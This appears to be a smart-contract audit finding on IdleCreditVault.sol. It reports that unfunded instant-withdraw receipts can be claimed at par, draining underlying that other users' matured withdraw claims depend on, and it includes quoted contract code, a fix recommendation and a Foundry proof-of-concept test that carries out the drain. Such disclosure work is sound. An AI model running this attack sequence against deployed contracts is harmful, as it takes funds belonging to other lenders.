### Title
Unfunded instant-withdraw receipts can be claimed at par, draining underlying reserved for matured withdraw claims - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`claimInstantWithdrawRequest` burns the caller's receipt tokens and pays `instantWithdrawsRequests[_user]` out of the strategy's underlying balance with no check that the request was ever funded via `collectInstantWithdrawFunds` — the "use-after-free" analog: a receipt whose backing was never committed (or was already consumed) is redeemed against a shared balance. [1](#0-0) 

### Finding Description
`requestInstantWithdraw` burns the CDO's strategy tokens and mints an equal receipt to the user, incrementing `instantWithdrawsRequests[_user]`, `instantWithdrawsRequestsByEpoch`, `instantWithdrawClaimsByEpoch` and `pendingInstantWithdraws` [2](#0-1) . Funding is a separate step: `collectInstantWithdrawFunds` pulls underlying from the CDO and decrements `pendingInstantWithdraws` [3](#0-2) .

`claimInstantWithdrawRequest`, however, has no maturity/funding gate analogous to the `epochNumber <= lastWithdrawRequest[_user]` check in `_claimFundedWithdrawRequest` [4](#0-3) . It simply reads the aggregate `instantWithdrawsRequests[_user]`, burns it, zeroes the counter, and calls `_transferFundedClaim` [5](#0-4) . `_transferFundedClaim` only carves out `defaultRecoveryReserve`; every other underlying held by the strategy — underlying already collected to back matured *normal* withdraw receipts (`collectWithdrawFunds` pulled it from the CDO into this same contract) — is spendable [6](#0-5) .

So an unprivileged lender who opens an instant-withdraw request whose funding was never collected can still claim it at par, paid out of underlying that the strategy holds on behalf of other users' funded/matured claims. The broken invariant is "one receipt one payout": the receipt is redeemed against backing belonging to a different claim cohort.

### Impact Explanation
Direct theft: the attacker receives `instantWithdrawsRequests[attacker]` underlying that was reserved for funded withdraw-request claimants. Those claimants' subsequent `claimWithdrawRequest` calls then revert on `safeTransfer` (insufficient balance) or are haircut by the shortfall — quantified loss equals the unfunded instant amount claimed, bounded by the strategy's unreserved underlying balance.

### Likelihood Explanation
Requires a pool configuration where instant withdraws are enabled and the strategy holds collected withdraw funding (normal operation after a `stopEpoch` collects receipts). The attack window is between the attacker's `requestInstantWithdraw` and the borrower's funding of it. The residual uncertainty is whether `IdleCDOEpochVariant.claimInstantWithdrawRequest` imposes an external funding gate before calling into the strategy; the strategy function itself contains none, so any CDO path that forwards a claim before `collectInstantWithdrawFunds` covers the receipt enables the drain.

### Recommendation
In `claimInstantWithdrawRequest`, pay only the funded portion of the receipt — e.g., track per-user funded instant balances (or gate claims on `pendingInstantWithdraws`-style epoch settlement like normal requests), and revert/skip when the receipt's epoch has not been collected. Alternatively, require the CDO to call `collectInstantWithdrawFunds` atomically before any claim and assert `instantWithdrawClaimsByEpoch[epoch]` is fully funded before releasing underlying.

```solidity
// Foundry fork PoC sketch (setup mirrors test/foundry/IdleCreditVault.t.sol)
function testUnfundedInstantClaimStealsFundedReserve() external {
    // victim deposits and requests a normal withdraw
    uint256 amountWei = 10000 * ONE_SCALE;
    _depositWithUser(victim, amountWei, true);
    vm.prank(victim);
    cdoEpoch.requestWithdraw(0, address(AAtranche));

    // epoch rolls over; borrower funds the pending withdraw, which
    // pull underlying into the strategy via collectWithdrawFunds
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr, _expectedFundsEndEpoch());
    uint256 stratBal = underlying.balanceOf(address(strategy));
    assertGt(stratBal, 0);

    // attacker deposits, requests instant withdraw — funded or not,
    // pendingInstantWithdraws is NOT yet collected
    _depositWithUser(attacker, amountWei, true);
    vm.prank(attacker);
    cdoEpoch.requestInstantWithdraw(0, address(AAtranche));

    // attacker claims before collectInstantWithdrawFunds funds the receipt
    uint256 balBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();
    uint256 stolen = underlying.balanceOf(attacker) - balBefore;
    assertGt(stolen, 0); // paid out of victim's funded reserve

    // victim's matured claim now reverts / underpays
    vm.prank(victim);
    vm.expectRevert();
    cdoEpoch.claimWithdrawRequest();
}
```

```text
  function requestInstantWithdraw(uint256 _amount, address _user) external {
    _onlyIdleCDO();
    _ensureDefaultRecoveryInitialized();
    // burn strategy tokens from cdo
    _burn(msg.sender, _amount);
  
    // mint equal amount of strategy tokens to the user as receipt, useful in case of default
    _mint(_user, _amount);

    // increase the instant withdraw requests for the user
    instantWithdrawsRequests[_user] += _amount;
    uint256 currentEpoch = epochNumber;
    // we record both per-user (old, kept for compatibility) and per-epoch so on
    // finalization we can distinguish "default-epoch pending instant receipts"
    // from old funded instant receipts.
    instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
    // increase the total instant withdraw requests
    pendingInstantWithdraws += _amount;
  }
```

```text
  function claimInstantWithdrawRequest(address _user) external {
    _onlyIdleCDO();
    if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
      // Clear the defaulted-epoch instant receipt first, then continue so the same call can
      // also pay any older instant receipt that was already funded before default finalization.
      _claimDefaultedInstantWithdrawRequest(_user);
    }
    uint256 amount = instantWithdrawsRequests[_user];
    // burn strategy tokens from user
    _burn(_user, amount);

    instantWithdrawsRequests[_user] = 0;
    _transferFundedClaim(_user, amount);
  }
```

```text
  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
  }
```
